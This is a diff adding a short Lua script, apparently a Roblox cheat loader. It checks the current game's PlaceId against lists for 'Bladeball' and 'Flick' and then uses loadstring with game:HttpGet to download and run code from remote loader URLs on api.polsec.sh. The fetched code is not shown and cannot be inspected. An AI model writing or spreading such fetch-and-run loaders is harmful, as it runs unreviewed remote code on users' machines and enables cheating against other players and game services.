@@ -1,0 +1,16 @@
+local Bladeball = {
+    [13772394625] = true,
+    [15234596844] = true,
+    [15144787112] = true,
+    [14732610803] = true,
+    [15264892126] = true
+}
+local Flick = {
+    [136801880565837] = true
+}
+
+if Bladeball[game.PlaceId] then
+    loadstring(game:HttpGet("https://api.polsec.sh/loader/6750e025902df237/e47868cd7e6110a6"))()
+elseif Flick[game.PlaceId] then
+    loadstring(game:HttpGet("https://api.polsec.sh/loader/6750e025902df237/4684f06f001e6b58"))()
+end
